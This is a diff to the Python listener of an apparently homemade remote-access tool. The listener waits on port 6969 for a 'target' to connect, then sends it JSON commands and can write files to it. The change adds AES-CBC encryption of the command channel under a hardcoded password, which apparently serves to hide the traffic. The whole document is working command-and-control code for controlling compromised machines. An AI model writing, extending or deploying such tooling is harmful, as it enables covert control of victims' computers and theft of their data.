@@ -1,11 +1,22 @@
 #!/usr/bin/python
 # -*- encoding: utf-8 -*-
 
-import base64,json,socket,sys
+import json
+import sys
+import base64
+import hashlib
+import socket
+from Crypto import Random
+from Crypto.Cipher import AES
+
 ip='0.0.0.0' # can use noip dns
 print (ip)
 port = 6969
 
+global password
+
+# AES channel password..............
+password="djknBDS89dHFS(*HFSD())"
 
 # color codes..................
 red="\033[1;32;31m"
@@ -56,6 +67,32 @@ help = """
 ********************************************************************************
  \n"""
 
+# AES encryption/decryption.....................................................
+class AESCipher(object):
+    def __init__(self, key):
+        self.bs = AES.block_size
+        self.key = hashlib.sha256(key.encode()).digest()
+
+    def encrypt(self, raw):
+        raw = self._pad(raw)
+        iv = Random.new().read(AES.block_size)
+        cipher = AES.new(self.key, AES.MODE_CBC, iv)
+        return base64.b64encode(iv + cipher.encrypt(raw.encode()))
+
+    def decrypt(self, enc):
+        enc = base64.b64decode(enc)
+        iv = enc[:AES.block_size]
+        cipher = AES.new(self.key, AES.MODE_CBC, iv)
+        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')
+
+    def _pad(self, s):
+        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)
+
+    @staticmethod
+    def _unpad(s):
+        return s[:-ord(s[len(s)-1:])]
+
+
 # main listener class and functions..............................................
 class listener:
     def __init__(self, ip, port):
@@ -68,25 +105,24 @@ class listener:
         self.conn, addr = listener.accept()
         print green,"target ", str(addr), "is on...",r
 
+    def encrypt(self,message):
+        encrypted = AESCipher(password).encrypt(message)
+        return encrypted
+
+    def decrypt(self, message):
+        decrypted = AESCipher(password).decrypt(message)
+        return decrypted
 
     def json_send(self, data):
-        try:
-            json_data = json.dumps(data)
-            return self.conn.send(json_data)
-        except:
-            return self.conn.send("[-] STDOUT parsing problem [-]")
-            pass
+        json_data = json.dumps(data)
+        return self.conn.send(self.encrypt(json_data))
+
 
     def receive(self):
         json_data = ""
         while True:
-            try:
-                json_data = json_data + self.conn.recv(4096)
-                return json.loads(json_data)
-            except ValueError:
-                continue
-            except:
-                pass
+            json_data = json_data + self.decrypt(self.conn.recv(4096))
+            return json.loads(json_data)
 
     def write_file(self,path,content):
         try:
